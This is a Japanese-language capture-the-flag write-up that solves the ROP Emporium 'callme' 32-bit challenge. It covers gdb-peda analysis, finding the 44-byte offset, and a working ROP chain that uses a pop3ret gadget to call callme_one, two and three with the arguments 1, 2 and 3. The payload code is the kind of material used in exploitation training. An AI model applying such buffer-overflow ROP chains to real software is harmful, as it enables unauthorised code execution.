```
patto -> 44
```

ようやくROPらしい問題

libcallme32.so という共有ライブラリが渡されている

```
gdb-peda$ i func
All defined functions:

Non-debugging symbols:
0x08048558  _init
0x08048590  printf@plt
0x080485a0  fgets@plt
0x080485b0  callme_three@plt
0x080485c0  callme_one@plt
0x080485d0  puts@plt
0x080485e0  exit@plt
0x080485f0  __libc_start_main@plt
0x08048600  setvbuf@plt
0x08048610  memset@plt
0x08048620  callme_two@plt
0x08048640  _start
0x08048670  __x86.get_pc_thunk.bx
0x08048680  deregister_tm_clones
0x080486b0  register_tm_clones
0x080486f0  __do_global_dtors_aux
0x08048710  frame_dummy
0x0804873b  main
0x080487b6  pwnme
0x0804880c  usefulFunction
0x08048850  __libc_csu_init
0x080488b0  __libc_csu_fini
0x080488b4  _fini
```

`callme_one, callme_two, callme_three, usefulFunction` 辺りを使いそう

```
gdb-peda$ disas usefulFunction
Dump of assembler code for function usefulFunction:
0x0804880c <+0>: push   ebp
0x0804880d <+1>:  mov    ebp,esp
0x0804880f <+3>: sub    esp,0x8
0x08048812 <+6>:  sub    esp,0x4
0x08048815 <+9>: push   0x6
0x08048817 <+11>: push   0x5
0x08048819 <+13>:  push   0x4
0x0804881b <+15>: call   0x80485b0 <callme_three@plt>
0x08048820 <+20>:  add    esp,0x10
0x08048823 <+23>: sub    esp,0x4
0x08048826 <+26>:  push   0x6
0x08048828 <+28>: push   0x5
0x0804882a <+30>:  push   0x4
0x0804882c <+32>: call   0x8048620 <callme_two@plt>
0x08048831 <+37>:  add    esp,0x10
0x08048834 <+40>: sub    esp,0x4
0x08048837 <+43>:  push   0x6
0x08048839 <+45>: push   0x5
0x0804883b <+47>:  push   0x4
0x0804883d <+49>: call   0x80485c0 <callme_one@plt>
0x08048842 <+54>:  add    esp,0x10
0x08048845 <+57>: sub    esp,0xc
0x08048848 <+60>:  push   0x1
0x0804884a <+62>: call   0x80485e0 <exit@plt>
 ```

とりあえず `usefulFunction` に飛ばしてみるも確か `callme_three` でつまずく

`callme_one, callme_two, callme_three` の詳細を知るために、渡された共有ライブラリを逆アセンブルする

```shell
$ objdump -d -M intel libcallme32.so > libcallme32.dis
```

軽く見てみるとone, two, threeとも1,2,3という引数が渡されているかチェックしていて、間違っていると `Incorrect parameters` と表示するようになっている

よって、とりあえず `callme_three` を引数1,2,3で呼んでみる

```shell
$ python -c 'print "A" * 44 + "\xb0\x85\x04\x08" + "A" * 4 + "\x01\x00\x00\x00" + "\x02\x00\x00\x00" + "\x03\x00\x00\x00"' > input.txt
# "A" * 4 というのはcallme_threeのreturnアドレス、このようにダミーでもいいのでreturnアドレスを置いておかないと、引数が上手く渡ってくれない
$ gdb callme32

gdb-peda$ b *0x0804880b # pwnmeのretにBreakpoint
Breakpoint 1 at 0x804880b
gdb-peda$ run < input.txt
```

すると `callme_three` は `key2.dat` というファイルを開いているのがわかる。同様に他の２つも見てみると、 `callme_two` が `key1.dat` を `callme_one` が `encrypted_flag.txt` を開いているのがわかる。

よって、 `callme_one` を呼んでから `callme_two` , `callme_three` の順に呼べばデコードしてくれそうだなと推測する。

やってみると、

```shell
~/yyy-d/work/ctf/pwn/ROP-Emporium/callme32:yyy@[master](๑˃̵ᴗ˂̵)ﻭ < python exploit.py
[+] Starting local process './callme32': pid 14010
callme by ROP Emporium
32bits

Hope you read the instructions...
>
[*] Process './callme32' stopped with exit code 0 (pid 14010)
ROPE{a_placeholder_32byte_flag!}
```

コードはexploit.pyにある


exploit.pyより
```python
payload = ''
payload += 'A' * 44
payload += "\xc0\x85\x04\x08"  # callme_one@plt
payload += "\xa9\x88\x04\x08"  # pop3ret (return addr)
payload += argument # callme_one(1, 2, 3)
payload += "\x20\x86\x04\x08"  # callme_two@plt
payload += "\xa9\x88\x04\x08"  # pop3ret
payload += argument
payload += "\xb0\x85\x04\x08"  # calle_three@plt
payload += 'A' * 4             # padding
payload += argument
payload += '\n'
```
本来 `callme_one` のreturnアドレスが入るところにはpop3ret gadgetを置いている

これにより、 `callme_one` に渡した引数3つをスタックから除くことができ、スタックをいい感じに調整できる

他の2つも同様に、いい感じに配置する
